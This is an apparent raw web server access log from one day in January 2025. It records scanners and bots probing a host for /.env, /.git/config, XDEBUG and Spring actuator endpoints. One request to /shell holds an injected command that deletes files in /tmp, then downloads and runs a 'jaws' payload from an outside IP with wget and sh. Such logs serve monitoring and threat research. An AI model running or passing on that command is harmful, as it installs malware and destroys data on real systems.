154.213.187.122 - - [06/Jan/2025:00:03:07 +0000] "GET /login.rsp HTTP/1.1" 302 350 "-" "Hello World"
141.98.11.119 - - [06/Jan/2025:16:51:58 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "Hello World"
80.82.77.202 - - [06/Jan/2025:17:10:39 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/7.0.4(0x17000428) NetType/WIFI Language/zh_CN"
93.174.93.12 - - [06/Jan/2025:17:11:01 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Windows NT 5.1; rv:38.0) Gecko/20100101 Firefox/38.0 SeaMonkey/2.35"
1.170.23.171 - - [06/Jan/2025:17:11:28 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
91.223.3.201 - - [06/Jan/2025:17:19:46 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
205.210.31.176 - - [06/Jan/2025:17:27:35 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
78.153.140.149 - - [06/Jan/2025:17:30:27 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [06/Jan/2025:17:30:27 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
185.82.219.124 - - [06/Jan/2025:17:52:15 +0000] "GET /.env HTTP/1.0" 302 350 "-" "Mozilla/5.0 (Windows NT 6.0; rv:40.0) Gecko/20100101 Firefox/40.0"
87.120.115.119 - - [06/Jan/2025:18:10:46 +0000] "GET /.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.145 Safari/537.36 Vivaldi/2.6.1566.49"
179.43.191.146 - - [06/Jan/2025:18:34:30 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
117.72.64.87 - - [06/Jan/2025:18:42:59 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 129.159.107.197/jaws;sh+/tmp/jaws" 400 527 "-" "-"
115.22.173.247 - - [06/Jan/2025:18:59:58 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
115.22.173.247 - - [06/Jan/2025:19:00:00 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
175.203.25.208 - - [06/Jan/2025:19:16:22 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
5.181.190.248 - - [06/Jan/2025:19:17:52 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
78.153.140.149 - - [06/Jan/2025:19:20:09 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [06/Jan/2025:19:20:09 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
46.19.138.234 - - [06/Jan/2025:19:25:05 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
114.33.80.80 - - [06/Jan/2025:19:39:39 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
205.210.31.64 - - [06/Jan/2025:19:40:28 +0000] "\x16\x03\x01" 400 527 "-" "-"
205.210.31.64 - - [06/Jan/2025:19:40:29 +0000] "\x16\x03\x01" 400 527 "-" "-"
78.153.140.149 - - [06/Jan/2025:19:48:06 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [06/Jan/2025:19:48:06 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
172.104.11.34 - - [06/Jan/2025:19:51:32 +0000] "\x16\x03\x01" 400 527 "-" "-"
92.255.57.58 - - [06/Jan/2025:20:08:26 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 966 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
206.168.34.208 - - [06/Jan/2025:20:31:45 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
206.168.34.208 - - [06/Jan/2025:20:31:52 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.208 - - [06/Jan/2025:20:31:53 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.208 - - [06/Jan/2025:20:31:54 +0000] "GET / HTTP/1.1" 200 966 "http://35.243.94.80/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.208 - - [06/Jan/2025:20:31:55 +0000] "PRI * HTTP/2.0" 400 527 "-" "-"
131.108.76.193 - - [06/Jan/2025:20:37:05 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
170.249.164.242 - - [06/Jan/2025:20:37:59 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
92.255.57.58 - - [06/Jan/2025:21:15:16 +0000] "GET /actuator/gateway/routes HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
92.255.57.58 - - [06/Jan/2025:21:15:20 +0000] "GET / HTTP/1.1" 200 966 "http://35.243.94.80:80/actuator/gateway/routes" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
220.83.192.242 - - [06/Jan/2025:21:16:39 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
193.34.212.75 - - [06/Jan/2025:21:25:13 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
78.153.140.149 - - [06/Jan/2025:21:29:10 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [06/Jan/2025:21:29:10 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
8.211.162.45 - - [06/Jan/2025:21:30:31 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
95.214.53.198 - - [06/Jan/2025:21:37:46 +0000] "POST /goform/webLogin HTTP/1.1" 302 387 "http://35.243.94.80:80/login_inter.asp" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36"
185.16.39.104 - - [06/Jan/2025:21:38:44 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
92.255.57.58 - - [06/Jan/2025:21:41:30 +0000] "\x16\x03\x01\x05\xa8\x01" 400 527 "-" "-"
45.79.128.205 - - [06/Jan/2025:21:45:55 +0000] "\x16\x03\x01" 400 527 "-" "-"
43.159.148.221 - - [06/Jan/2025:21:50:34 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
112.167.200.181 - - [06/Jan/2025:21:57:20 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
218.161.31.246 - - [06/Jan/2025:22:35:52 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
175.195.144.72 - - [06/Jan/2025:22:50:23 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
185.16.39.104 - - [06/Jan/2025:22:51:12 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
91.223.3.201 - - [06/Jan/2025:23:04:49 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.149 - - [06/Jan/2025:23:15:05 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [06/Jan/2025:23:15:06 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
193.34.212.75 - - [06/Jan/2025:23:57:37 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
